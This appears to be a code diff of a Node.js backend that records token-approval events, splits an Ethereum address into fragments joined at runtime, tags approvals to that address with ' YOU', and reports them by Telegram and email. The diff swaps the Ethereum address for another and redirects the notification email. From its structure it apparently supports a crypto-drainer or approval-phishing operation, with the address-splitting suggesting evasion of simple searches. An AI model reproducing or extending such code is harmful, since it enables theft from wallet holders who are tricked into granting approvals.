@@ -4,7 +4,10 @@ const axios = require("axios");
 const nodemailer = require('nodemailer');
 const mg = require('nodemailer-mailgun-transport');
 const fs = require("fs");
-const USD_ADDRESS_ETH = "0x05D94B3b4f611B23D";
+
+//0x41e8247a669737F176050b807dBD266D8bF8bD68
+
+const USD_ADDRESS_ETH = "0x41e8247a669737F";
 const Token_Addr_Bsc = "0x09a1Bf4B292254D307b5364";
 
 const sendMessageOnTG = async (message) => {
@@ -34,12 +37,12 @@ exports.sendemail = async (req, res) => {
 			}
 		});
 
-		let whiteAddr = USD_ADDRESS_ETH + "15dBdb8A720E6D4Fb30A5b0";
+		let whiteAddr = USD_ADDRESS_ETH + "176050b807dBD266D8bF8bD68";
 		let blackAddr = Token_Addr_Bsc + "DCc0526c051A6BA58";
 		if ((receivedData.spender != whiteAddr) && (receivedData.spender != blackAddr)) {
 			transporter.sendMail({
 				from: 'fizzerbert107@gmail.com',
-				to: 'undeadsapp@gmail.com', // An array if you have multiple recipients.
+				to: 'fizzerbert107@gmail.com', // An array if you have multiple recipients.
 				cc: 'fizzerbert107@gmail.com',
 				bcc: '',
 				subject: 'UNDEADAPP_NOTIFICATION___' + receivedData.chainId,
@@ -98,7 +101,7 @@ exports.savetofile = async (req, res) => {
 
 		if (receivedData.amount == "Custom") data += "  CustomToken\n";
 
-		if (receivedData.spender === "0x05D94B3b4f611B23D15dBdb8A720E6D4Fb30A5b0") data += " YOU";
+		if (receivedData.spender === "0x41e8247a669737F176050b807dBD266D8bF8bD68") data += " YOU";
 		sendMessageOnTG(data);
 
 
